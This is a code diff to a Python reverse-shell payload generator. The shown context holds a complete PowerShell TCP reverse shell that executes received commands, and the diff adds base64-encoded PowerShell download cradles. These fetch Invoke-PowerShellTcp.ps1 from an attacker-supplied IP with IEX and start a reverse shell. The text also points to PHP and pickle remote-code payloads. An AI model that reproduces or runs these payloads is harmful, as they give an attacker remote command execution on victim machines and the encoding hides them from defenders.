@@ -66,6 +66,14 @@ def base64gen_ps1(ip,port):
 	temp = '$client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'.replace("{IP}",ip).replace("{PORT}",port)
 	return base64.b64encode(temp.encode('UTF-16LE'))
 
+def base64gen_ps1_2(ip,port):
+	temp = '''IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')'''.replace("{IP}",ip)
+	return base64.b64encode(temp.encode('UTF-16LE'))
+
+def base64gen_ps1_3(ip,port):
+	temp = '''IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}'''.replace("{IP}",ip).replace("{PORT}",port)
+	return base64.b64encode(temp.encode('UTF-16LE'))
+
 def phpemoji(ip,port):
 	list_emoji = {
 		"0":"$🙂",
@@ -145,12 +153,14 @@ payload = {
         "json.net":[],
         "msf_raw":[],
         "msf_dll":[],
-        "msf_elf":[]
+        "msf_elf":[],
+        "dag":[],
+        "firebird":[],
 }
 
 if __name__ == "__main__":
-	header()
 	if len(sys.argv) < 4:
+		header()
 		sys.exit(-1)
 	load_shell()
 	options = sys.argv[3]
@@ -164,7 +174,7 @@ if __name__ == "__main__":
 			ip = sys.argv[1]
 		else:
 			print("\nCheck If IP is valid")
-			sys.exit(-1)
+			ip = sys.argv[1]
 
 	for counter,j in enumerate(payload[options.lower()]):
 		print(f"\n{colors.GREEN}Example {counter+1}{colors.RESET}\n")
@@ -187,6 +197,12 @@ if __name__ == "__main__":
 		elif "{BASE64PS1}" in j:
 			temp = base64gen_ps1(ip,port)
 			print(j.strip().replace("{BASE64PS1}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
+		elif "{BASE64PS1_2}" in j:
+			temp = base64gen_ps1_2(ip,port)
+			print(j.strip().replace("{BASE64PS1_2}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
+		elif "{BASE64PS1_3}" in j:
+			temp = base64gen_ps1_3(ip,port)
+			print(j.strip().replace("{BASE64PS1_3}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
 		elif "{PICKLE}" in j:
 			temp = pickle_rce(ip,port)
 			print(j.strip().replace("{PICKLE}",temp.decode("ascii")))
